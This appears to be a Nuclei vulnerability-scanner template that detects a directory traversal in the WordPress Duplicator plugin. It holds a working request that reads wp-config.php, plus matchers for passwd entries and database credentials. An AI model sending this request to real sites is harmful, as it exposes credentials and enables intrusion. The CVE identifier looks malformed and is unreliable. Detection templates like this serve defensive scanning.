id: CVE-2020-117382
info:
  author: dwisiswant0
  description: 'The issue is being actively exploited, and allows attackers

    to download arbitrary files, such as the wp-config.php file.

    According to the vendor, the vulnerability was only in two

    versions v1.3.24 and v1.3.26, the vulnerability wasn''t

    present in versions 1.3.22 and before.

    '
  name: WordPress Duplicator plugin Directory Traversal
  reference: https://www.tenable.com/blog/duplicator-wordpress-plugin-vulnerability-exploited-in-the-wild
  severity: high
  tags: cve,cve2020,wordpress,wp-plugin,lfi
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: header
    regex:
    - File Transfer
    - application/octet-stream
    - attachment; filename="(wp-config\.php|passwd)"
    type: regex
  - condition: or
    part: body
    regex:
    - 'root:[x*]:0:0:'
    - define\('DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)'
    type: regex
  matchers-condition: and
  raw:
  - 'GET /wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    '
